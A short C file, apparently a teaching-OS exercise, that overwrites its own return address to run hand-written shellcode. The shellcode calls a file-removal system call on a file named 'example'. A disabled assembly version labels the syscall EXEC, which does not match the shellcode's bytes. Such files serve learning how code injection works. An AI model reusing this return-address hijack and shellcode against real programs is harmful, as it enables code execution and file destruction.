//exploit of remove system call by Ngwe Sandar Linn

#include <syscall.h>

char shellcode[] = "\xE9\x0A\x00\x00\x00\x6A\x05\xCD\x30\x6A\x00\x6A\x01\xCD\x30\xE8\xF1\xFF\xFF\xFF""example";

int main(void)
{
  #if 1
    int *ret;
    ret = (int*)&ret + 2;
    (*ret) = (int)shellcode;
    return 1;
  
  #else
  __asm__("jmp    0x0f;"             /* jump to CALL */
    /* actual address of string pushed as return address by CALL */
          "push   $0x4;"             /* push EXEC syscall number */
          "int    $0x30;"            /* make syscall */
          "xor    %eax,%eax;"        /* load 0 in eax */
          "push   %eax;"             /* push exit_status */
          "inc    %eax;"             /* inc eax to 1 */
          "push   %eax;"             /* push EXIT syscall number */
          "int    $0x30;"            /* make syscall */
    /* CALL */"call   -0x0C;"            /* jumps back again */
          ".string \"example\";"       /* program to start */

    
    );
    #endif
}